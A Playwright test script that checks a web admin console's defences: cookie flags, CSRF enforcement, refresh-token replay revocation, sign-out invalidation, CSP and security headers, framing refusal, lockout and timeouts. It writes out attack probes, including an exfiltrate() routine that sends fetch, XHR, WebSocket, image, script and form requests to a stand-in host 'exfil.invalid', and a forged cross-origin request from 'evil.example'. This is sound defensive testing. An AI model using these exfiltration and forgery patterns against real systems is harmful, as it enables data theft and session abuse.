// SPDX-License-Identifier: AGPL-3.0-only
// P07 slice-2 execution: real Chromium against the shipped Compose profile and the shipped nginx
// edge example. Steps (argv[2]): s03 | s04 | locked | forced | slow. Reads a private JSON config
// (P07_CFG) that holds the disposable operator password; prints and stores only sanitized results
// (sha256 prefixes of cookie values, booleans, header names/values that are not secrets).
import { chromium } from "playwright";
import { createHash } from "node:crypto";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";

const cfg = JSON.parse(readFileSync(process.env.P07_CFG, "utf8"));
const step = process.argv[2];
const ORIGIN = "https://blindpass.example";
const INPUT_ORIGIN = "https://input.example";
const DOC_CSP = "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'";
const hash8 = (value) => createHash("sha256").update(value).digest("hex").slice(0, 8);
const out = { step, date: new Date().toISOString(), checks: [] };
mkdirSync(cfg.outDir, { recursive: true });

function check(name, ok, detail = {}) {
  out.checks.push({ name, ok: Boolean(ok), ...detail });
  console.log(`${ok ? "PASS" : "FAIL"} ${step}: ${name}`);
}

async function launch() {
  const rules = [`MAP blindpass.example:443 127.0.0.1:${cfg.port}`, `MAP input.example:443 127.0.0.1:${cfg.port}`,
    "MAP exfil.invalid 127.0.0.1:9"].join(", ");
  return chromium.launch({
    executablePath: "/usr/bin/chromium",
    args: [`--host-resolver-rules=${rules}`, `--ignore-certificate-errors-spki-list=${cfg.spki}`]
  });
}

/** A fresh profile that records every request, failure, CSP violation and page error. */
async function watch(browser) {
  const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
  await context.addInitScript(() => {
    const seen = [];
    window.__csp = seen;
    document.addEventListener("securitypolicyviolation", (event) => seen.push(`${event.violatedDirective} ${event.blockedURI}`));
  });
  const page = await context.newPage();
  const log = { requests: [], failures: [], documents: [], errors: [], raw: [] };
  page.on("request", (request) => log.raw.push(request));
  page.on("request", (request) => log.requests.push({ url: request.url(), method: request.method(), referer: request.headers()["referer"] ?? null, type: request.resourceType() }));
  page.on("requestfailed", (request) => log.failures.push({ url: request.url(), reason: request.failure()?.errorText }));
  page.on("response", (response) => {
    if (response.request().resourceType() === "document") log.documents.push({ url: response.url(), status: response.status(), headers: response.headers() });
  });
  page.on("pageerror", (error) => log.errors.push(error.message));
  page.on("console", (message) => { if (message.type() === "error") log.errors.push(message.text().slice(0, 200)); });
  return { context, page, log, violations: () => page.evaluate(() => window.__csp ?? []).catch(() => []) };
}

function cookieAttributes(cookies) {
  return cookies.filter((cookie) => cookie.name.startsWith("bp_")).map((cookie) => ({
    name: cookie.name, httpOnly: cookie.httpOnly, secure: cookie.secure, sameSite: cookie.sameSite,
    path: cookie.path, domain: cookie.domain, expires: cookie.expires, valueSha256Prefix: hash8(cookie.value), valueLength: cookie.value.length
  }));
}

async function signIn(page, password, { expectForcedChange = false } = {}) {
  await page.goto(`${ORIGIN}/login`);
  await page.getByLabel("Username").fill(cfg.username);
  await page.getByLabel("Password", { exact: true }).fill(password);
  await page.getByRole("button", { name: "Sign in" }).click();
  if (expectForcedChange) {
    await page.waitForURL(/\/change-password/, { timeout: 20000 });
    return;
  }
  await page.waitForURL((url) => !/\/login/.test(url.pathname), { timeout: 20000 });
}

async function api(page, method, path, { csrf, body } = {}) {
  return page.evaluate(async ({ method, path, csrf, body }) => {
    const headers = { "Content-Type": "application/json" };
    if (csrf) headers["X-CSRF-Token"] = csrf;
    const response = await fetch(path, { method, headers, body: body === undefined ? undefined : JSON.stringify(body), credentials: "include" });
    let error = null;
    try { error = (await response.json()).error ?? null; } catch { /* no JSON body */ }
    return { status: response.status, error, hsts: response.headers.get("strict-transport-security") };
  }, { method, path, csrf, body });
}

async function storageReport(page, secrets) {
  return page.evaluate(async (secrets) => {
    const contains = (text) => secrets.some((secret) => secret && text.includes(secret));
    const local = Object.entries(localStorage), session = Object.entries(sessionStorage);
    const databases = indexedDB.databases ? await indexedDB.databases() : [];
    let idbText = "";
    for (const info of databases) {
      await new Promise((resolve) => {
        const open = indexedDB.open(info.name);
        open.onerror = () => resolve();
        open.onsuccess = async () => {
          const db = open.result;
          for (const store of db.objectStoreNames) {
            await new Promise((done) => {
              const request = db.transaction(store).objectStore(store).getAll();
              request.onsuccess = () => { idbText += JSON.stringify(request.result); done(); };
              request.onerror = () => done();
            });
          }
          db.close(); resolve();
        };
      });
    }
    return {
      localStorageKeys: local.map(([key]) => key), sessionStorageKeys: session.map(([key]) => key),
      indexedDbNames: databases.map((database) => database.name), indexedDbBytes: idbText.length,
      localStorageHoldsSecret: contains(JSON.stringify(local)), sessionStorageHoldsSecret: contains(JSON.stringify(session)),
      indexedDbHoldsSecret: contains(idbText), documentCookieNames: document.cookie.split("; ").filter(Boolean).map((pair) => pair.split("=")[0])
    };
  }, secrets);
}

async function evidence(name, browser, w) {
  writeFileSync(join(cfg.outDir, `${name}.requests.json`), JSON.stringify({ requests: w.log.requests, failures: w.log.failures, errors: w.log.errors, violations: await w.violations() }, null, 1));
}

async function s03() {
  const browser = await launch();
  const w = await watch(browser);
  const { page, context } = w;
  const secrets = [cfg.password];
  await page.goto(`${ORIGIN}/login`);
  check("no bp_ cookie and empty storage before sign-in", cookieAttributes(await context.cookies()).length === 0);
  await signIn(page, cfg.password);
  const cookies = await context.cookies();
  const attributes = cookieAttributes(cookies);
  out.cookies = attributes;
  const byName = Object.fromEntries(attributes.map((cookie) => [cookie.name, cookie]));
  check("bp_session is HttpOnly, Secure, SameSite=Strict, Path=/", byName.bp_session?.httpOnly && byName.bp_session?.secure && byName.bp_session?.sameSite === "Strict" && byName.bp_session?.path === "/", { cookie: byName.bp_session });
  check("bp_refresh is HttpOnly, Secure, SameSite=Strict and scoped to the refresh path", byName.bp_refresh?.httpOnly && byName.bp_refresh?.secure && byName.bp_refresh?.sameSite === "Strict" && byName.bp_refresh?.path === "/api/v3/admin/session/refresh", { cookie: byName.bp_refresh });
  check("bp_csrf is Secure, SameSite=Strict, Path=/ and readable by script (double-submit)", byName.bp_csrf && !byName.bp_csrf.httpOnly && byName.bp_csrf.secure && byName.bp_csrf.sameSite === "Strict" && byName.bp_csrf.path === "/", { cookie: byName.bp_csrf });
  check("every bp_ cookie is host-only on blindpass.example", attributes.every((cookie) => cookie.domain === "blindpass.example"));
  const sessionValue = cookies.find((cookie) => cookie.name === "bp_session").value;
  const refreshValue1 = cookies.find((cookie) => cookie.name === "bp_refresh").value;
  const csrf1 = cookies.find((cookie) => cookie.name === "bp_csrf").value;
  secrets.push(sessionValue, refreshValue1);
  const storage = await storageReport(page, secrets);
  out.storage = storage;
  check("no credential in localStorage, sessionStorage or IndexedDB", !storage.localStorageHoldsSecret && !storage.sessionStorageHoldsSecret && !storage.indexedDbHoldsSecret, { storage });
  check("script-readable cookies are only the CSRF value", storage.documentCookieNames.every((name) => name === "bp_csrf"), { names: storage.documentCookieNames });
  const html = await page.content();
  check("no secret in the rendered DOM", !secrets.some((secret) => secret && html.includes(secret)));

  // CSRF and origin on a state-changing call.
  const body = { current_password: "x".repeat(12), new_password: "y".repeat(14) };
  const noCsrf = await api(page, "POST", "/api/v3/admin/session/change-password", { body });
  check("state-changing call without the CSRF header is denied (403 csrf_denied)", noCsrf.status === 403 && noCsrf.error === "csrf_denied", { result: noCsrf });
  const wrongCsrf = await api(page, "POST", "/api/v3/admin/session/change-password", { csrf: "0".repeat(32), body });
  check("state-changing call with a wrong CSRF value is denied", wrongCsrf.status === 403 && wrongCsrf.error === "csrf_denied", { result: wrongCsrf });
  const read = await api(page, "GET", "/api/v3/admin/session");
  check("session read works with the cookie (200)", read.status === 200, { result: read });

  // Cross-origin forgery: a page on another origin cannot ride the cookies.
  const evil = await context.newPage();
  await evil.route("https://evil.example/**", (route) => route.fulfill({ status: 200, contentType: "text/html", body: "<!doctype html><title>evil</title>" }));
  await evil.goto("https://evil.example/");
  const forged = await evil.evaluate(async ({ origin, csrf, body }) => {
    try {
      const response = await fetch(`${origin}/api/v3/admin/session/change-password`, { method: "POST", credentials: "include", headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf }, body: JSON.stringify(body) });
      return { reached: true, status: response.status };
    } catch (error) { return { reached: false, error: String(error).slice(0, 60) }; }
  }, { origin: ORIGIN, csrf: csrf1, body });
  check("cross-origin forged state change with credentials never reaches a response (CORS/SameSite)", forged.reached === false, { forged });
  await evil.close();

  // Refresh rotation and replay of the old refresh credential.
  const rotated = await api(page, "POST", "/api/v3/admin/session/refresh", { csrf: csrf1 });
  check("refresh rotates the session (200)", rotated.status === 200, { result: rotated });
  const after = await context.cookies();
  const refreshValue2 = after.find((cookie) => cookie.name === "bp_refresh")?.value;
  const csrf2 = after.find((cookie) => cookie.name === "bp_csrf")?.value;
  check("refresh issued a new refresh credential", refreshValue2 && refreshValue2 !== refreshValue1, { before: hash8(refreshValue1), after: refreshValue2 ? hash8(refreshValue2) : null });
  // Replay the rotated-out credential from a clean profile.
  const replayBrowser = await watch(browser);
  await replayBrowser.page.goto(`${ORIGIN}/login`);
  await replayBrowser.context.addCookies([
    { name: "bp_refresh", value: refreshValue1, url: `${ORIGIN}/api/v3/admin/session/refresh`, httpOnly: true, secure: true, sameSite: "Strict" },
    { name: "bp_csrf", value: csrf1, url: `${ORIGIN}/`, secure: true, sameSite: "Strict" }
  ]);
  const replay = await api(replayBrowser.page, "POST", "/api/v3/admin/session/refresh", { csrf: csrf1 });
  check("replaying the rotated-out refresh credential is refused (401)", replay.status === 401, { result: replay });
  const familyAfter = await api(page, "GET", "/api/v3/admin/session");
  check("replay revoked the whole session family (current session now 401)", familyAfter.status === 401, { result: familyAfter });
  await replayBrowser.context.close();

  // Fresh sign-in, then sign-out in the real console and server-side invalidation.
  await context.clearCookies();
  await signIn(page, cfg.password);
  const live = await context.cookies();
  const liveSession = live.find((cookie) => cookie.name === "bp_session").value;
  const liveRefresh = live.find((cookie) => cookie.name === "bp_refresh").value;
  const liveCsrf = live.find((cookie) => cookie.name === "bp_csrf").value;
  await page.getByRole("button", { name: "Sign out" }).first().click().catch(async () => {
    await page.getByRole("button", { name: /sign out/i }).first().click();
  });
  await page.waitForURL(/\/login/, { timeout: 15000 });
  const cleared = cookieAttributes(await context.cookies());
  check("sign-out clears the bp_ cookies in the browser", cleared.length === 0, { remaining: cleared.map((cookie) => cookie.name) });
  const stale = await watch(browser);
  await stale.page.goto(`${ORIGIN}/login`);
  await stale.context.addCookies([
    { name: "bp_session", value: liveSession, url: `${ORIGIN}/`, httpOnly: true, secure: true, sameSite: "Strict" },
    { name: "bp_refresh", value: liveRefresh, url: `${ORIGIN}/api/v3/admin/session/refresh`, httpOnly: true, secure: true, sameSite: "Strict" },
    { name: "bp_csrf", value: liveCsrf, url: `${ORIGIN}/`, secure: true, sameSite: "Strict" }
  ]);
  const staleRead = await api(stale.page, "GET", "/api/v3/admin/session");
  check("the signed-out session cookie is refused server-side (401)", staleRead.status === 401, { result: staleRead });
  const staleRefresh = await api(stale.page, "POST", "/api/v3/admin/session/refresh", { csrf: liveCsrf });
  check("the signed-out refresh credential is refused server-side (401)", staleRefresh.status === 401, { result: staleRefresh });
  await stale.context.close();
  const violations = await w.violations();
  check("no CSP violation during the S03 journey", violations.length === 0, { violations });
  check("every request of the journey is same-origin", w.log.requests.every((request) => new URL(request.url).origin === ORIGIN || request.url.startsWith("https://evil.example") || request.url.startsWith("data:")), { origins: [...new Set(w.log.requests.map((request) => new URL(request.url).origin))] });
  await evidence("s03", browser, w);
  await browser.close();
}

async function headersFor(page, url) {
  const response = await page.goto(url);
  return { status: response.status(), headers: response.headers() };
}

async function exfiltrate(page, label) {
  // The page's own script context tries every channel to a non-allowed origin.
  const attempts = await page.evaluate(async () => {
    const results = {};
    const settle = (name, promise) => promise.then((value) => { results[name] = { ok: true, value }; }, (error) => { results[name] = { ok: false, error: String(error).slice(0, 80) }; });
    await settle("fetch", fetch("https://exfil.invalid/beacon?x=1", { mode: "no-cors" }).then(() => "sent"));
    await settle("xhr", new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open("GET", "https://exfil.invalid/x"); x.onload = () => resolve("sent"); x.onerror = () => reject(new Error("xhr blocked")); x.send(); }));
    await settle("websocket", new Promise((resolve, reject) => { try { const s = new WebSocket("wss://exfil.invalid/ws"); s.onopen = () => resolve("open"); s.onerror = () => reject(new Error("ws blocked")); } catch (e) { reject(e); } }));
    await settle("image", new Promise((resolve, reject) => { const i = new Image(); i.onload = () => resolve("loaded"); i.onerror = () => reject(new Error("img blocked")); i.src = "https://exfil.invalid/p.gif"; }));
    await settle("script", new Promise((resolve, reject) => { const s = document.createElement("script"); s.src = "https://exfil.invalid/s.js"; s.onload = () => resolve("loaded"); s.onerror = () => reject(new Error("script blocked")); document.head.appendChild(s); }));
    await settle("form", new Promise((resolve) => { const f = document.createElement("form"); f.action = "https://exfil.invalid/post"; f.method = "post"; document.body.appendChild(f); try { f.submit(); } catch { /* blocked */ } setTimeout(() => resolve("attempted"), 300); }));
    return results;
  });
  await page.waitForTimeout(500);
  return attempts;
}

async function s04() {
  const browser = await launch();
  const w = await watch(browser);
  const { page, context } = w;
  const reports = {};
  for (const [label, url] of [["console", `${ORIGIN}/login`], ["input", `${INPUT_ORIGIN}/?id=p07-dummy&metadata_sig=p07-dummy&submit_sig=p07-dummy`]]) {
    const { status, headers } = await headersFor(page, url);
    reports[label] = { status, headers: Object.fromEntries(["content-security-policy", "strict-transport-security", "x-frame-options", "x-content-type-options", "referrer-policy", "cross-origin-opener-policy", "permissions-policy", "cache-control"].map((name) => [name, headers[name] ?? null])) };
    const h = reports[label].headers;
    check(`${label}: served CSP equals the documented policy`, h["content-security-policy"] === DOC_CSP, { served: h["content-security-policy"] });
    check(`${label}: no localhost, wildcard, bare scheme or unsafe source in the served CSP`, !/localhost|127\.0\.0\.1|\*|unsafe-eval|unsafe-inline|(^|[\s;])https?:([\s;]|$)|(^|[\s;])wss?:([\s;]|$)/.test(h["content-security-policy"] ?? ""));
    check(`${label}: HSTS is max-age=31536000 with no includeSubDomains or preload (edge)`, h["strict-transport-security"] === "max-age=31536000", { served: h["strict-transport-security"] });
    check(`${label}: framing, sniffing, referrer, opener and caching headers`, h["x-frame-options"] === "DENY" && h["x-content-type-options"] === "nosniff" && h["referrer-policy"] === "no-referrer" && h["cross-origin-opener-policy"] === "same-origin" && h["cache-control"] === "no-store", { h });
    // Allowed same-origin call works; Referer is absent under no-referrer.
    const ready = await api(page, "GET", "/readyz");
    check(`${label}: an allowed same-origin API call works (readyz 200)`, ready.status === 200, { ready });
    // allHeaders() is the wire view (CDP extra info); headers() can omit what the network stack adds.
    const sent = w.log.raw.filter((request) => request.url().endsWith("/readyz")).at(-1);
    const wire = sent ? await sent.allHeaders() : null;
    check(`${label}: no Referer header on a same-origin request (Referrer-Policy: no-referrer)`, wire !== null && wire["referer"] === undefined, { wireHeaderNames: wire ? Object.keys(wire).sort() : null, referrerPolicyOnDocument: reports[label].headers["referrer-policy"] });
    const before = await w.violations();
    const attempts = await exfiltrate(page, label);
    const violations = (await w.violations()).filter((violation) => violation.includes("exfil.invalid"));
    reports[label].exfiltration = attempts;
    reports[label].violations = violations;
    const directives = new Set(violations.map((violation) => violation.split(" ")[0]));
    check(`${label}: fetch, XHR, WebSocket, image and script to a non-allowed origin all fail`, ["fetch", "xhr", "websocket", "image", "script"].every((channel) => attempts[channel]?.ok === false), { attempts });
    check(`${label}: a securitypolicyviolation was recorded for connect, img and script (and form)`, ["connect-src", "img-src", "script-src-elem"].every((directive) => [...directives].some((d) => d.startsWith(directive.replace("-elem", "")))), { directives: [...directives], count: violations.length, beforeCount: before.length });
    check(`${label}: no request to the forbidden origin completed`, !w.log.requests.some((request) => request.url.startsWith("https://exfil.invalid") && !w.log.failures.some((failure) => failure.url === request.url)), { forbiddenRequests: w.log.requests.filter((request) => request.url.includes("exfil.invalid")).length, failedAll: w.log.failures.filter((failure) => failure.url.includes("exfil.invalid")).map((failure) => failure.reason).slice(0, 6) });
  }
  // Framing refusal: a different origin embeds the console and the input page.
  const framer = await context.newPage();
  const consoleMessages = [];
  framer.on("console", (message) => consoleMessages.push(message.text().slice(0, 160)));
  await framer.route("https://attacker.example/**", (route) => route.fulfill({ status: 200, contentType: "text/html", body: `<!doctype html><iframe id=a src="${ORIGIN}/login"></iframe><iframe id=b src="${INPUT_ORIGIN}/"></iframe>` }));
  await framer.goto("https://attacker.example/frame");
  await framer.waitForTimeout(2500);
  const frames = framer.frames().filter((frame) => frame !== framer.mainFrame());
  const states = [];
  for (const frame of frames) {
    let rendered = false;
    try { rendered = (await frame.locator("#root").count()) > 0 || (await frame.locator("input").count()) > 0; } catch { rendered = false; }
    states.push({ url: frame.url().slice(0, 80), rendered });
  }
  check("framing the console and the input page from another origin is refused (nothing rendered)", states.length >= 1 && states.every((state) => !state.rendered), { states, consoleMessages });
  await framer.close();
  check("every request of the browsing journey is to the edge origins or the blocked exfil target", w.log.requests.every((request) => /^https:\/\/(blindpass|input|exfil)\.(example|invalid)\//.test(request.url) || request.url.startsWith("data:") || request.url.startsWith("https://attacker.example")), { origins: [...new Set(w.log.requests.map((request) => new URL(request.url).origin))] });
  out.reports = reports;
  await evidence("s04", browser, w);
  await browser.close();
}

async function locked() {
  // The real console shows the lock to an operator whose pair/account is locked.
  const browser = await launch();
  const w = await watch(browser);
  const { page } = w;
  await page.goto(`${ORIGIN}/login`);
  await page.getByLabel("Username").fill(cfg.username);
  await page.getByLabel("Password", { exact: true }).fill(cfg.password);
  const responses = [];
  page.on("response", (response) => { if (response.url().endsWith("/session/login")) responses.push({ status: response.status(), retryAfter: response.headers()["retry-after"] ?? null }); });
  await page.getByRole("button", { name: "Sign in" }).click();
  await page.waitForTimeout(3000);
  const stillOnLogin = /\/login/.test(new URL(page.url()).pathname);
  const visibleText = (await page.locator("body").innerText().catch(() => "")).replace(/\s+/g, " ");
  const lockNotice = /account is locked after too many failed sign-ins\. Try again in about \d+ min/.exec(visibleText)?.[0] ?? null;
  out.lockedView = { responses, stillOnLogin, lockNotice };
  check(cfg.expectLocked ? "console sign-in of a locked account is refused with 423, stays on the login page and shows the lock notice with a retry time" : "console sign-in succeeds", cfg.expectLocked ? responses.some((response) => response.status === 423) && stillOnLogin && lockNotice !== null : !stillOnLogin, out.lockedView);
  await evidence(`locked-${cfg.expectLocked ? "423" : "ok"}`, browser, w);
  await browser.close();
}

async function forced() {
  // After an administrator reset, the temporary password forces the real change flow.
  const browser = await launch();
  const w = await watch(browser);
  const { page, context } = w;
  await signIn(page, cfg.temporaryPassword, { expectForcedChange: true });
  const gated = await api(page, "GET", "/api/v3/admin/operators");
  check("a temporary-password session is blocked from admin routes (403 password_change_required)", gated.status === 403 && gated.error === "password_change_required", { gated });
  await page.getByLabel("Current password").fill(cfg.temporaryPassword);
  await page.getByLabel("New password", { exact: true }).fill(cfg.nextPassword);
  await page.getByLabel("Confirm new password").fill(cfg.nextPassword);
  await page.getByRole("button", { name: "Set password and continue" }).click();
  await page.waitForTimeout(2500);
  const afterChange = new URL(page.url()).pathname;
  check("the forced change completes and the console is usable", !/change-password/.test(afterChange), { afterChange });
  const cookies = cookieAttributes(await context.cookies());
  out.cookies = cookies;
  await evidence("forced", browser, w);
  await browser.close();
}

async function slow() {
  const browser = await launch();
  const w = await watch(browser);
  const { page, context } = w;
  await page.goto(`${ORIGIN}/login`);
  await page.getByLabel("Username").fill(cfg.username);
  await page.getByLabel("Password", { exact: true }).fill(cfg.password);
  const pause = spawnSync("docker", ["pause", cfg.controllerContainer]);
  if (pause.status !== 0) throw new Error("could not pause the controller container");
  const started = Date.now();
  let seen = null;
  try {
    await page.getByRole("button", { name: "Sign in" }).click();
    const deadline = started + 45000;
    while (Date.now() < deadline) {
      const alerts = await page.locator("[role=alert]").allInnerTexts().catch(() => []);
      const text = alerts.join(" | ");
      if (/did(n't| not) answer|in time|could not be reached|timed out|try again/i.test(text)) { seen = text; break; }
      await page.waitForTimeout(250);
    }
  } finally {
    spawnSync("docker", ["unpause", cfg.controllerContainer]);
  }
  const elapsed = Date.now() - started;
  const cookies = cookieAttributes(await context.cookies());
  const stillOnLogin = /\/login/.test(new URL(page.url()).pathname);
  out.slow = { elapsedMs: elapsed, message: seen?.slice(0, 200) ?? null, cookiesSet: cookies.map((cookie) => cookie.name), stillOnLogin };
  check("the console reports a bounded timeout within 30 s total", seen !== null && elapsed <= 30000, out.slow);
  // The console sets the double-submit CSRF value before sign-in; no session or refresh credential may exist.
  check("no session or refresh cookie was set and the page stayed on the login form", cookies.every((cookie) => cookie.name === "bp_csrf") && stillOnLogin, out.slow);
  await evidence("slow", browser, w);
  await browser.close();
}

const steps = { s03, s04, locked, forced, slow };
if (!steps[step]) throw new Error(`unknown step ${step}`);
try {
  await steps[step]();
} catch (error) {
  check(`step ${step} completed without an exception`, false, { error: String(error).slice(0, 300) });
}
writeFileSync(join(cfg.outDir, `${step}${cfg.stepSuffix ?? ""}.summary.json`), JSON.stringify(out, null, 1));
process.exit(out.checks.every((entry) => entry.ok) ? 0 : 1);
